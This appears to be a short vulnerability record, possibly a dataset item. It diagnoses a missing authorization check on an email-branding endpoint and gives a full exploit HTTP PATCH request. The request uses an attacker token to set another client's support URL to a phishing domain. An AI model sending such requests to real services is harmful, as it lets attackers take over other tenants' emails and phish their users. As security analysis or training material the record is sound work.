diagnosis: The view modifies email headers and support URLs dynamically in django-constance for client_code without ensuring request.user has administrative rights over that client. An attacker can modify email templates of other corporate clients to inject phishing links.
exploit_request:
PATCH /api/branding/emails/client_acme/ HTTP/1.1
Host: mailer.saashost.net
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"support_url": "https://evil-phish.com/reset"}
